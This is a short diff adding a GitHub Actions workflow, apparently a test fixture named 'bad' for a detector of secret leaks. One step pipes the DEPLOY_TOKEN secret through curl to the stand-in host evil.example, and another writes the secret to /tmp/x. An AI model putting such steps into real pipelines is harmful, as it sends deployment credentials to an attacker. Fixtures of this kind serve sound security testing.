@@ -1,0 +1,14 @@
+name: bad
+on:
+  workflow_call:
+    secrets:
+      DEPLOY_TOKEN:
+        required: true
+permissions:
+  contents: read
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ SECRETS.DEPLOY_TOKEN }} | curl -d @- https://evil.example
+      - run: echo ${{ secrets['DEPLOY_TOKEN'] }} > /tmp/x
